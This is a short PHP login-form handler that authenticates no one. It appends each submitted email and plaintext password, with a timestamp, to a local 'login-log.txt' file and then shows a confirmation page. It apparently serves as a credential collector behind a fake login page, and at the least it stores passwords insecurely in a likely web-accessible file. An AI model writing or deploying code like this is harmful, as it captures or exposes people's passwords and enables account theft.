<?php
// Simple logging of login form data

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    
    // Log the data to a file
    $logData = date('Y-m-d H:i:s') . ' - Email: ' . $email . ' - Password: ' . $password . "\n";
    file_put_contents('login-log.txt', $logData, FILE_APPEND);
    
    // Display confirmation
    echo '<h1>Login Received</h1>';
    echo '<p>Email: ' . htmlspecialchars($email) . '</p>';
    echo '<p>Password: ' . str_repeat('*', strlen($password)) . '</p>';
    echo '<p><a href="index.html">Back to Login</a></p>';
} else {
    header('Location: index.html');
}
?>
